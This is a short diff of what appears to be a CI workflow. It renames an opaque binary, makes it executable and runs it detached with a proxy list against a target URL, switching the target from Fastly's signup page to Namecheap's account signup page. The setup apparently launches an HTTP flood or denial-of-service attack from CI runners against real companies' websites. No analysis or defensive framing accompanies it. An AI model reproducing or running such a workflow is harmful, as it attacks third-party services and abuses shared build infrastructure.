@@ -35,7 +35,7 @@ jobs:
           mv  Fc-main/proxy.txt 90.txt
           mv tol o
           chmod +x o
-          export TARGET="https://www.fastly.com/signup"
+          export TARGET="https://www.namecheap.com/myaccount/signup/"
           
           
           screen -dms ve ./o $TARGET 200 1 1 90.txt
